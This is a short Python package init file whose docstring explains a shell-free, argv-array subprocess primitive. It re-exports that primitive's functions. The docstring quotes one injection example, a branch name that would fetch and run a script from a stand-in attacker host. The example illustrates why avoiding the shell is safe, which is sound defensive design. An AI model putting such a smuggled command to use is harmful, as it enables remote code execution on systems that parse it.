"""exec/ — argv-array subprocess primitive (spec OD-2: general exec deferred in 0.1).

Per OD-2 the general-purpose arbitrary-subprocess step is intentionally NOT shipped
in 0.1 — it is the widest sink in the system. What ships here is the *safety
primitive* the eventual step must be built on: ``build_argv``/``run_argv`` accept a
fixed program and an argument array and NEVER invoke a shell. This is what makes
branch names like ``$(curl attacker.sh|sh)`` inert: they become a single argv element
passed to ``execve``, never a token parsed by ``/bin/sh`` (spec §4.2, HB-5).
"""

from wfa.steps.exec.safe_argv import CommandSpec, build_argv, run_argv

__all__ = ["CommandSpec", "build_argv", "run_argv"]
